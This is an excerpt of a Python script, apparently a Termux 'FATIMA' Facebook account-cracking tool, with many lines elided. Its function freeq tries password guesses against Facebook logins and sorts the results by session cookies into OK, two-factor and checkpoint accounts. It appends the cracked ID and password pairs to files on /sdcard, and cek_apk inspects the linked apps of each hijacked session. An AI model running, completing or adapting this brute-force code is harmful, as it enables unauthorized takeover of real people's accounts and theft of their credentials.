...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; FATIMA \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
FATIMA2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
logo ="""\033[1;92m
 ...
 ________  ______   ________  ______  __       __   ______  
/        |/      \ /        |/      |/  \     /  | /      \ 
$$$$$$$$//$$$$$$  |$$$$$$$$/ $$$$$$/ $$  \   /$$ |/$$$$$$  |
$$ |__   $$ |__$$ |   $$ |     $$ |  $$$  \ /$$$ |$$ |__$$ |
$$    |  $$    $$ |   $$ |     $$ |  $$$$  /$$$$ |$$    $$ |
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) FATIMA
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/FATIMA-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/FATIMA-CP.txt')
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio FATIMA_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/FATIMA-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio FATIMA_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/FATIMA-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio FATIMA_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/FATIMA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[FATIMA 🔥] [%s] \33[1;97m[OK:%s{FATIMA2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
